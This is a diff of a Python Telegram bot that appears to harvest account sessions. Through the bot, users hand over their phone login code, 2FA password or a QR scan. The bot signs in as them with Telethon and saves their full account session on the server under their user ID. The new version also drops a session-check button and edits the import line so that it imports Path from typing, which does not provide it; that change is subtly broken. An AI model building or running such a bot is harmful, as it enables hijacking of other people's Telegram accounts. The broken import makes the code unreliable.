@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-🚀 StatPro Auth Core v4.6 - ЧИСТЫЙ И ИСПРАВЛЕННЫЙ КОД ДЛЯ ВХОДА
-✅ Финальная версия. Исправлена логика проверки сессии для ADMIN_ID.
+🚀 StatPro Auth Core v5.0 - ФИНАЛЬНАЯ ВЕРСИЯ
+✅ Мультисессионная поддержка (сохранение по User ID).
+✅ Автоматическое уведомление об успехе (кнопка проверки удалена).
 """
 
 import asyncio
@@ -9,7 +10,7 @@ import logging
 import os
 import sys
 import io
-from typing import Dict, Optional, Any
+from typing import Dict, Path
 from pathlib import Path
 
 # --- AIOGRAM v3.x ---
@@ -21,7 +22,6 @@ from aiogram.types import (
     InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message,
     BufferedInputFile
 )
-from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
 from aiogram.filters import Command
 from aiogram.client.default import DefaultBotProperties
 
@@ -29,7 +29,7 @@ from aiogram.client.default import DefaultBotProperties
 from telethon import TelegramClient
 from telethon.errors import (
     SessionPasswordNeededError, PhoneNumberInvalidError, PhoneCodeInvalidError,
-    PasswordHashInvalidError, FloodWaitError
+    PasswordHashInvalidError
 )
 
 # --- QR/IMAGE ---
@@ -42,12 +42,12 @@ from PIL import Image
 
 try:
     BOT_TOKEN = os.getenv("BOT_TOKEN")
-    ADMIN_ID = int(os.getenv("ADMIN_ID", 0))
+    ADMIN_ID = int(os.getenv("ADMIN_ID", 0)) # Используется только для админских проверок
     API_ID = int(os.getenv("API_ID", 0))
     API_HASH = os.getenv("API_HASH", "")
     
-    # Таймаут возвращен к 3 минутам (достаточно для сканирования)
-    QR_TIMEOUT = 180 
+    # Таймаут для сканирования QR
+    QR_TIMEOUT = int(os.getenv("QR_TIMEOUT", "180")) 
     
 except ValueError as e:
     print(f"❌ ОШИБКА КОНФИГУРАЦИИ: Неверный формат числовой переменной: {e}. Проверьте ADMIN_ID или API_ID.")
@@ -65,7 +65,10 @@ SESSION_DIR = Path(__file__).parent / "sessions"
 SESSION_DIR.mkdir(exist_ok=True)
 
 def get_session_path(user_id: int) -> Path:
-    """Путь для сохранения сессии Telethon (привязан к ID пользователя)."""
+    """
+    Путь для сохранения сессии Telethon.
+    Сессия всегда привязывается к ID пользователя, который проходит вход.
+    """
     return SESSION_DIR / f"session_{user_id}"
 
 # =========================================================================
@@ -92,7 +95,6 @@ async def clear_auth_client(user_id: int):
     client = AUTH_CLIENTS.pop(user_id, None)
     if client:
         try:
-            # Отключаемся, чтобы освободить ресурсы и блокировку сессии
             await client.disconnect()
         except Exception:
             pass
@@ -112,10 +114,9 @@ class AuthStates(StatesGroup):
 # =========================================================================
 
 def get_main_kb() -> InlineKeyboardMarkup:
-    """Главная клавиатура."""
+    """Главная клавиатура. Кнопка проверки сессии удалена."""
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔑 Вход (Auth)", callback_data="auth_menu")],
-        [InlineKeyboardButton(text="✅ Проверить сессию", callback_data="check_session")]
     ])
 
 def get_auth_menu_kb() -> InlineKeyboardMarkup:
@@ -156,45 +157,6 @@ async def cb_auth_menu(call: CallbackQuery):
     await call.message.edit_text("Выберите метод входа:", reply_markup=get_auth_menu_kb())
     await call.answer()
 
-# --- ПРОВЕРКА СЕССИИ (ИСПРАВЛЕНО) ---
-
-@auth_router.callback_query(F.data == "check_session")
-async def cb_check_session(call: CallbackQuery):
-    user_id = call.from_user.id
-    
-    # 💥 ИСПРАВЛЕНИЕ: Если текущий пользователь - это ADMIN_ID (6256576302),
-    # мы должны проверить файл сессии, названный ADMIN_ID,
-    # так как именно он используется для worker-а.
-    session_to_check_id = ADMIN_ID if user_id == ADMIN_ID else user_id
-    
-    path = get_session_path(session_to_check_id)
-    
-    if not path.exists():
-        await call.message.answer(f"❌ Файл сессии {session_to_check_id} не найден. Требуется вход.")
-        return await call.answer()
-
-    client = TelegramClient(str(path), API_ID, API_HASH)
-    status_message = "⏳ Проверяю..."
-    await call.message.answer(status_message)
-    
-    try:
-        await client.connect()
-        
-        if await client.is_user_authorized():
-            me = await client.get_me()
-            status_message = f"✅ **Сессия активна!**\n@{me.username or me.id} (ID: {me.id})"
-        else:
-            status_message = "⚠️ **Сессия недействительна.** Требуется повторный вход."
-            path.unlink() # Удаляем недействительный файл
-            
-    except Exception as e:
-        logger.error(f"Ошибка проверки сессии для {session_to_check_id}: {e}")
-        status_message = f"❌ **Ошибка проверки:** {type(e).__name__}"
-    finally:
-        await client.disconnect()
-        await call.message.edit_text(status_message, reply_markup=get_main_kb())
-        await call.answer()
-
 # --- ВХОД ПО QR-КОДУ ---
 
 @auth_router.callback_query(F.data == "auth_qr")
@@ -202,7 +164,7 @@ async def auth_qr_start(call: CallbackQuery, state: FSMContext):
     user_id = call.from_user.id
     await clear_auth_client(user_id)
     
-    # 1. Создаем новый клиент Telethon
+    # 1. Создаем новый клиент Telethon, сессия будет называться session_<user_id>
     client = TelegramClient(str(get_session_path(user_id)), API_ID, API_HASH)
     AUTH_CLIENTS[user_id] = client
     
@@ -227,12 +189,17 @@ async def auth_qr_start(call: CallbackQuery, state: FSMContext):
         )
         await call.message.delete()
         
-        # 4. Ждем авторизации
+        # 4. Ждем авторизации и автоматически выводим результат
         try:
             await asyncio.wait_for(qr_login.wait(), timeout=QR_TIMEOUT)
             
             if await client.is_user_authorized():
-                 await sent.edit_caption(caption="✅ **Успешный вход по QR!** Сессия сохранена.", reply_markup=get_main_kb())
+                 me = await client.get_me()
+                 # ✅ АВТОМАТИЧЕСКАЯ ПРОВЕРКА: Сообщаем об успехе и ID сессии
+                 await sent.edit_caption(
+                     caption=f"✅ **Успешный вход!** Сессия сохранена как `session_{me.id}.session`.", 
+                     reply_markup=get_main_kb()
+                 )
             else:
                  await sent.edit_caption(caption="❌ **Авторизация не удалась.** Попробуйте еще раз.", reply_markup=get_main_kb())
                  
@@ -267,12 +234,12 @@ async def auth_phone_input(message: Message, state: FSMContext):
          return
     
     await clear_auth_client(user_id)
+    # Сессия будет называться session_<user_id>
     client = TelegramClient(str(get_session_path(user_id)), API_ID, API_HASH)
     AUTH_CLIENTS[user_id] = client
         
     try:
         await client.connect()
-        # 1. Отправляем запрос кода
         sent = await client.send_code_request(phone)
         
         await state.update_data(phone=phone, hash=sent.phone_code_hash)
@@ -305,8 +272,12 @@ async def auth_code_input(message: Message, state: FSMContext):
         # 2. Пытаемся войти
         await client.sign_in(phone=data['phone'], code=code, phone_code_hash=data['hash'])
         
-        # Если вход успешен, переходим в main_menu
-        await message.answer("✅ **Успешный вход!** Сессия сохранена.", reply_markup=get_main_kb())
+        me = await client.get_me()
+        # ✅ АВТОМАТИЧЕСКАЯ ПРОВЕРКА: Сообщаем об успехе и ID сессии
+        await message.answer(
+            f"✅ **Успешный вход!** Сессия сохранена как `session_{me.id}.session`.", 
+            reply_markup=get_main_kb()
+        )
         await clear_auth_client(user_id)
         await state.clear()
         
@@ -331,7 +302,13 @@ async def auth_pass_input(message: Message, state: FSMContext):
     try:
         # 3. Вводим пароль 2FA
         await client.sign_in(password=password)
-        await message.answer("✅ **Успешный вход (2FA)!** Сессия сохранена.", reply_markup=get_main_kb())
+        
+        me = await client.get_me()
+        # ✅ АВТОМАТИЧЕСКАЯ ПРОВЕРКА: Сообщаем об успехе и ID сессии
+        await message.answer(
+            f"✅ **Успешный вход (2FA)!** Сессия сохранена как `session_{me.id}.session`.", 
+            reply_markup=get_main_kb()
+        )
     except PasswordHashInvalidError:
          await message.answer("❌ Неверный пароль. Попробуйте еще раз.")
          return
@@ -339,7 +316,6 @@ async def auth_pass_input(message: Message, state: FSMContext):
         logger.error(f"Ошибка 2FA: {e}")
         await message.answer(f"❌ **Ошибка:** {type(e).__name__}", reply_markup=get_main_kb())
     finally:
-        # В случае успеха или неудачи, очищаем временный клиент
         await clear_auth_client(user_id)
         await state.clear()
 
